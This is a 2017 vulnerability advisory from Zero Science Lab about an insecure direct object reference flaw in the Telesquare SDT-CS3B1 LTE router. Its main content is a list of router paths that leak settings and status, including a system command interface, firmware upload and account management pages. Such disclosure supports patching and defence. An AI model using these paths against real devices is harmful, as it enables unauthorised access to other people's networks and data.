Telesquare SKT LTE Router SDT-CS3B1 Insecure Direct Object Reference Info Leak


Vendor: Telesquare Co., Ltd.
Product web page: http://www.telesquare.co.kr
Affected version: FwVer: SDT-CS3B1, sw version 1.2.0
                  LteVer: ML300S5XEA41_090  1 0.1.0
                  Modem model: PM-L300S

Summary: We introduce SDT-CS3B1 LTE router which is a SKT 3G and 4G
LTE wireless communication based LTE router product.

Desc: Insecure direct object references occur when an application
provides direct access to objects based on user-supplied input. As
a result of this vulnerability attackers can bypass authorization
and access resources and functionalities in the system.

Tested on: lighttpd/1.4.20
Linux mips


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2017-5445
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5445.php


22.12.2017

--



/home.html                                  <<  Version and status info leak (firmware, device, type, modem, lte)
/index.html                                 <<  Version and status info leak (firmware, device, type, modem, lte)
/nas/smbsrv.shtml                           <<  Samba server settings (workgroup, netbios name)
/nas/ftpsrv.shtml                           <<  FTP settings
/wifi2g/basic.shtml                         <<  Wireless settings
/admin/status.shtml                         <<  Access point status info leak
/internet/wan.shtml                         <<  WAN settings info leak (wanip, subnet, gateway, macaddr, lteipaddr, dns)
/internet/lan.shtml                         <<  LAN settings info leak (dhcpip, lanip, macaddr, gateway, subnet, dns)
/admin/statistic.shtml                      <<  System statistics info leak
/admin/management.shtml                     <<  System management (account settings, ntp settings, ddns settings)
/serial/serial_direct.shtml                 <<  Direct serial settings (network connection settings, serverip, port)
/admin/system_command.shtml                 <<  System command interface
/internet/dhcpcliinfo.shtml                 <<  DHCP Clients info leak (hostname, macaddr, ipaddr)
/admin/upload_firmware.shtml                <<  Router firmware and lte firmware upgrade
/firewall/vpn_futuresystem.shtml            <<  VPN settings (udp packet transfer, icmp check)
/cgi-bin/lte.cgi?Command=getUiccState       <<  GetUiccState()
/cgi-bin/lte.cgi?Command=getModemStatus     <<  Modem status info leak
/cgi-bin/systemutil.cgi?Command=SystemInfo  <<  System info leak